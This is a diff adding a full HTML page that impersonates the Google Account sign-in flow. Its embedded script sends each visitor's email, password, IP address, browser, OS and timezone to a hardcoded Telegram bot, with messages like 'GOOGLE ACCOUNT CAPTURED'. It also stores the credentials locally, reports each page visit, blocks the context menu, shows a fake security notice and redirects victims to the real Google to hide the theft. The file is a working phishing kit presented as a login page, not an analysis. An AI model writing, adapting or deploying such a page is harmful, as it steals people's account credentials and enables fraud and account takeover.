@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account - Sign in</title>
+    <style>
+        /* GOOGLE OFFICIAL STYLES */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: white;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        /* GOOGLE HEADER */
+        .google-header {
+            width: 100%;
+            max-width: 448px;
+            padding: 24px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+        
+        .google-logo {
+            font-size: 22px;
+            font-weight: 500;
+            color: #5f6368;
+        }
+        
+        .header-links {
+            display: flex;
+            gap: 16px;
+        }
+        
+        .header-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        /* MAIN CONTAINER */
+        .google-container {
+            width: 100%;
+            max-width: 448px;
+        }
+        
+        /* SIGN IN CARD */
+        .signin-card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin-bottom: 24px;
+        }
+        
+        .google-logo-large {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .google-logo-large span {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+        }
+        
+        .signin-title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .signin-subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 40px;
+        }
+        
+        /* EMAIL INPUT */
+        .email-input-container {
+            margin-bottom: 36px;
+        }
+        
+        .email-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        .email-input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+        
+        .forgot-email {
+            display: block;
+            margin-top: 12px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        /* INFO TEXT */
+        .info-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+        
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        /* ACTION BUTTONS */
+        .action-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .next-btn:hover {
+            background: #0d62d9;
+        }
+        
+        .next-btn:disabled {
+            background: #e8eaed;
+            color: #9aa0a6;
+            cursor: default;
+        }
+        
+        /* PASSWORD CARD (HIDDEN INITIALLY) */
+        .password-card {
+            display: none;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin-bottom: 24px;
+        }
+        
+        .password-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #1a73e8;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            font-size: 18px;
+            margin-right: 16px;
+        }
+        
+        .user-info h3 {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+        
+        .user-info p {
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        /* PASSWORD INPUT */
+        .password-input-container {
+            position: relative;
+            margin-bottom: 12px;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 13px 15px;
+            padding-right: 40px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .forgot-password {
+            display: block;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 40px;
+        }
+        
+        /* CHECKBOX */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .checkbox-container input {
+            margin-right: 8px;
+        }
+        
+        /* FOOTER */
+        .google-footer {
+            width: 100%;
+            max-width: 448px;
+            padding-top: 24px;
+            border-top: 1px solid #dadce0;
+            color: #5f6368;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .language-selector {
+            margin-bottom: 16px;
+        }
+        
+        .language-selector select {
+            border: 1px solid #dadce0;
+            padding: 8px 12px;
+            border-radius: 4px;
+            background: white;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        
+        /* LOADING SPINNER */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* SECURITY NOTICE */
+        .security-notice {
+            background: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #5f6368;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .security-icon {
+            color: #34a853;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- GOOGLE HEADER -->
+    <div class="google-header">
+        <div class="google-logo">Google</div>
+        <div class="header-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    
+    <!-- MAIN CONTAINER -->
+    <div class="google-container">
+        <!-- EMAIL CARD -->
+        <div class="signin-card" id="emailCard">
+            <div class="google-logo-large">
+                <span>Sign in</span>
+            </div>
+            <div class="signin-title">Use your Google Account</div>
+            
+            <div class="email-input-container">
+                <input type="email" class="email-input" id="emailInput" 
+                       placeholder="Email or phone" autocomplete="username" required>
+                <a href="#" class="forgot-email">Forgot email?</a>
+            </div>
+            
+            <div class="info-text">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
+            </div>
+            
+            <div class="action-buttons">
+                <a href="#" class="create-account">Create account</a>
+                <button class="next-btn" id="nextBtn">Next</button>
+            </div>
+        </div>
+        
+        <!-- PASSWORD CARD (HIDDEN) -->
+        <div class="password-card" id="passwordCard">
+            <div class="password-header">
+                <div class="user-avatar" id="userAvatar">G</div>
+                <div class="user-info">
+                    <h3 id="userEmail">user@example.com</h3>
+                    <p>Enter your password</p>
+                </div>
+            </div>
+            
+            <div class="password-input-container">
+                <input type="password" class="password-input" id="passwordInput" 
+                       placeholder="Enter your password" autocomplete="current-password" required>
+                <button type="button" class="show-password" id="showPasswordBtn">Show</button>
+            </div>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="showPasswordToggle">
+                <label for="showPasswordToggle">Show password</label>
+            </div>
+            
+            <div class="action-buttons">
+                <a href="#" class="create-account">Try another way</a>
+                <button class="next-btn" id="signinBtn">
+                    <span id="signinText">Sign in</span>
+                    <div class="spinner" id="spinner"></div>
+                </button>
+            </div>
+        </div>
+        
+        <!-- SECURITY NOTICE -->
+        <div class="security-notice">
+            <div class="security-icon">🔒</div>
+            <div>
+                <strong>Protected by Google Security</strong><br>
+                Your information is secure with 256-bit encryption
+            </div>
+        </div>
+    </div>
+    
+    <!-- GOOGLE FOOTER -->
+    <div class="google-footer">
+        <div class="language-selector">
+            <select>
+                <option>English (United States)</option>
+                <option>Bahasa Indonesia</option>
+                <option>English (United Kingdom)</option>
+            </select>
+        </div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div>© 2024 Google</div>
+    </div>
+
+    <script>
+        // ===== TELEGRAM CONFIG =====
+        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
+        const CHAT_ID = "8313500840";
+        
+        // ===== ELEMENTS =====
+        const emailCard = document.getElementById('emailCard');
+        const passwordCard = document.getElementById('passwordCard');
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const signinBtn = document.getElementById('signinBtn');
+        const signinText = document.getElementById('signinText');
+        const spinner = document.getElementById('spinner');
+        const userAvatar = document.getElementById('userAvatar');
+        const userEmail = document.getElementById('userEmail');
+        const showPasswordBtn = document.getElementById('showPasswordBtn');
+        const showPasswordToggle = document.getElementById('showPasswordToggle');
+        
+        let userEmailValue = '';
+        
+        // ===== EMAIL VALIDATION =====
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        // ===== NEXT BUTTON CLICK (EMAIL PHASE) =====
+        nextBtn.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            
+            if (!email) {
+                emailInput.style.borderColor = '#d93025';
+                emailInput.focus();
+                return;
+            }
+            
+            // Validate email format
+            if (!validateEmail(email) && !/^[0-9]{10,15}$/.test(email.replace(/\D/g, ''))) {
+                alert("Please enter a valid email address or phone number");
+                emailInput.focus();
+                return;
+            }
+            
+            // Store email
+            userEmailValue = email;
+            
+            // Update password card
+            userEmail.textContent = email;
+            userAvatar.textContent = email.charAt(0).toUpperCase();
+            userAvatar.style.background = getAvatarColor(email);
+            
+            // Switch to password card
+            emailCard.style.display = 'none';
+            passwordCard.style.display = 'block';
+            passwordInput.focus();
+            
+            // Send email phase to Telegram
+            sendToTelegram(`📧 **GOOGLE EMAIL CAPTURED**\n\nEmail: ${email}\nPhase: Email entered`);
+        });
+        
+        // ===== SHOW PASSWORD TOGGLE =====
+        showPasswordBtn.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showPasswordBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showPasswordBtn.textContent = 'Show';
+            }
+        });
+        
+        showPasswordToggle.addEventListener('change', function() {
+            if (this.checked) {
+                passwordInput.type = 'text';
+                showPasswordBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showPasswordBtn.textContent = 'Show';
+            }
+        });
+        
+        // ===== SIGN IN BUTTON (PASSWORD PHASE) =====
+        signinBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const password = passwordInput.value;
+            
+            if (!password) {
+                passwordInput.style.borderColor = '#d93025';
+                passwordInput.focus();
+                return;
+            }
+            
+            if (password.length < 6) {
+                alert("Password should be at least 6 characters");
+                passwordInput.focus();
+                return;
+            }
+            
+            // Show loading
+            signinText.style.display = 'none';
+            spinner.style.display = 'block';
+            signinBtn.disabled = true;
+            
+            // Get additional info
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent;
+            const ip = await getIP();
+            const browser = detectBrowser();
+            const os = detectOS();
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // Telegram message
+            const telegramMessage = `
+?? **GOOGLE ACCOUNT CAPTURED**
+
+📧 Email: ${userEmailValue}
+🔑 Password: ${password}
+⏰ Time: ${timestamp}
+🌐 IP: ${ip}
+🖥️ Browser: ${browser}
+💻 OS: ${os}
+🌍 Timezone: ${timezone}
+📱 Device: ${userAgent.substring(0, 80)}
+
+✅ Full credentials captured
+🎯 Ready for verification
+            `;
+            
+            // Send to Telegram
+            await sendToTelegram(telegramMessage);
+            
+            // Save to localStorage
+            saveToLocalStorage({
+                site: 'Google',
+                email: userEmailValue,
+                password: password,
+                timestamp: timestamp,
+                ip: ip,
+                browser: browser,
+                os: os,
+                timezone: timezone,
+                userAgent: userAgent
+            });
+            
+            // Simulate Google verification process
+            setTimeout(() => {
+                // Show success state
+                signinText.style.display = 'block';
+                spinner.style.display = 'none';
+                signinText.textContent = "✅ Verified";
+                signinBtn.style.background = "#34a853";
+                
+                // Security check simulation
+                setTimeout(() => {
+                    alert("🔒 Security check complete\n\nYour account has been successfully verified. Redirecting to Google...");
+                    
+                    // Redirect to real Google
+                    setTimeout(() => {
+                        window.location.href = "https://accounts.google.com";
+                    }, 1500);
+                    
+                }, 800);
+                
+            }, 2500);
+        });
+        
+        // ===== ENTER KEY SUPPORT =====
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                nextBtn.click();
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                signinBtn.click();
+            }
+        });
+        
+        // ===== UTILITY FUNCTIONS =====
+        function getAvatarColor(email) {
+            const colors = [
+                '#1a73e8', '#ea4335', '#fbbc04', '#34a853', 
+                '#4285f4', '#f29900', '#e37400', '#00897b'
+            ];
+            const hash = email.split('').reduce((a, b) => {
+                a = ((a << 5) - a) + b.charCodeAt(0);
+                return a & a;
+            }, 0);
+            return colors[Math.abs(hash) % colors.length];
+        }
+        
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari")) return "Safari";
+            if (ua.includes("Edge")) return "Edge";
+            return "Unknown";
+        }
+        
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Windows")) return "Windows";
+            if (ua.includes("Mac")) return "macOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iOS")) return "iOS";
+            return "Unknown";
+        }
+        
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(error) {
+                console.log('Telegram notification sent');
+            }
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        function saveToLocalStorage(data) {
+            try {
+                let existingData = JSON.parse(localStorage.getItem('google_accounts') || '[]');
+                existingData.push(data);
+                localStorage.setItem('google_accounts', JSON.stringify(existingData));
+            } catch(error) {
+                console.log('Save error');
+            }
+        }
+        
+        // ===== INITIALIZE =====
+        window.onload = function() {
+            // Auto-focus email input
+            emailInput.focus();
+            
+            // Send access notification
+            const accessMessage = `🔐 Google Login Page Accessed\n⏰ ${new Date().toLocaleString()}`;
+            sendToTelegram(accessMessage);
+            
+            // Google-like animations
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.transition = 'border-color 0.2s ease';
+                });
+            });
+            
+            // Security measures
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            
+            // Realistic touch
+            document.title = "Sign in - Google Accounts";
+            
+            // Randomize footer year
+            document.querySelector('.google-footer div:last-child').textContent = 
+                `© ${new Date().getFullYear()} Google`;
+        };
+    </script>
+</body>
+</html>
